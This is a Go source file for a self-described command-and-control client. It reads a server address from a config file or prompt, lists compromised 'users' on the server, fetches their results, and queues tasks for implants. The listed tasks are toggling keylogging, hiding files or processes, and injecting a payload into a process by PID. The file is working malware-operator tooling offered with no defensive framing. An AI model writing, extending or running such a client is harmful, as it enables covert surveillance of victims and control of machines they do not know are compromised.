package main

import (
  "fmt"
  "net/http"
  "io/ioutil"
  "os/exec"
  "os"
  "bytes"
  "encoding/json"
  "strings"
  "bufio"
)

func clears() {
  cmd := exec.Command("clear")
  cmd.Stdout = os.Stdout
  cmd.Run()
}

func getUsers(Link string){
  resp, err := http.Get(Link+"/users")
  if err != nil {
    fmt.Println("Error sending request")
    return
  }
  defer resp.Body.Close()
  
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    fmt.Println("Error reading message")
    return
  }
  fmt.Println(string(body))
}

func addTask(url string, name string, id int, arg1 string, arg2 string) {
  endp := url + "/tasks/" + name
  
  type task struct {
  	Name string `json:"name"`
  	ID   int    `json:"id"`
  	Arg1 string `json:"arg1"`
  	Arg2 string `json:"arg2"`
  }
  
  taskData := task{
  	Name: name,
  	ID:   id,
  	Arg1: arg1,
  	Arg2: arg2,
  }
  
  // Marshal the task struct into JSON
  data, err := json.Marshal(taskData)
  if err != nil {
  	fmt.Println("Error marshaling JSON:", err)
  	return
  }
  
  // Send a POST request with the JSON data
  resp, err := http.Post(endp, "application/json", bytes.NewBuffer(data))
  if err != nil {
  	fmt.Println("Error sending request:", err)
  	return
  }
  defer resp.Body.Close()
  
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
  	fmt.Println("Error reading response:", err)
  	return
  }
  
  fmt.Println(string(body))
}

func getStuff(Link string, name string, endp string) {
  endpoint := Link + endp + name
  resp, err := http.Get(endpoint)
  if err != nil {
    fmt.Println("Error sending request")
    return
  }
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    fmt.Println("Error reading message")
    return
  }
  fmt.Println(string(body))
}
func main() {
  var IP string
  var Port string
  var Option int
  var Whatever rune
  // for AddTask 
  var name string
  var id int
  var arg1 string
  var arg2 string
  // just the link...
  Link := "http://"
  
  fmt.Println("---------[ Command & Control Client ]---------")
  
  config := "conf/network.conf"

  if _, err := os.Stat(config); os.IsNotExist(err) {
    fmt.Print("Server IP: ")
    fmt.Scanln(&IP)
    fmt.Print("Server Port: ")
    fmt.Scanln(&Port)
  } else {
    file, err := os.Open(config)
    if err != nil {
      fmt.Println("Error opening file:", err)
      return
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
      line := scanner.Text()
      if strings.HasPrefix(line, "IP:") {
        IP = strings.TrimSpace(strings.TrimPrefix(line, "IP:"))
      } else if strings.HasPrefix(line, "Port:") {
        Port = strings.TrimSpace(strings.TrimPrefix(line, "Port:"))
      }
    }

    if err := scanner.Err(); err != nil {
      fmt.Println("Error reading file:", err)
      return
    }
  }
  
  Link += IP + ":" + Port
  for ;; {
    clears();
    fmt.Println("1 > List all users")               // WORKS
    fmt.Println("2 > Show specific user")
    fmt.Println("3 > Show results of specific user")
    fmt.Println("4 > Add new task to queue")        // WORKS
    fmt.Println("5 > Show tasks in queue\n")
    fmt.Print("Please pick an option\n > ")
    fmt.Scanln(&Option)
    switch Option {
    case 1:
      getUsers(Link)
    case 2:
      fmt.Print(" > Enter username: ")
      fmt.Scanln(&name)
      getStuff(Link, name, "/users/")
    case 3:
      fmt.Print(" > Enter username: ")
      fmt.Scanln(&name)
      getStuff(Link, name, "/results/")
    case 4:
      fmt.Print(" > Username: ")
      fmt.Scanln(&name)
      fmt.Println("1 > Keylogging on/off")
      fmt.Println("2 > Hide/Show File")
      fmt.Println("3 > Hide/Show Process")
      fmt.Println("4 > Inject into process <PID> <PAYLOAD>\n")
      fmt.Print(" > ID: ")
      fmt.Scanln(&id)
      fmt.Print(" > 1st Argument (Opt.): ")
      fmt.Scanln(&arg1)
      fmt.Print(" > 2nd Argument (Opt.): ")
      fmt.Scanln(&arg2)
      addTask(Link, name, id, arg1, arg2)
    case 5:
      fmt.Print(" > Enter username: ")
      fmt.Scanln(&name)
      getStuff(Link, name, "/tasks/")
    default:
      fmt.Println("[x] Invalid Option!")
    }
    fmt.Scanln(&Whatever)
  }
}
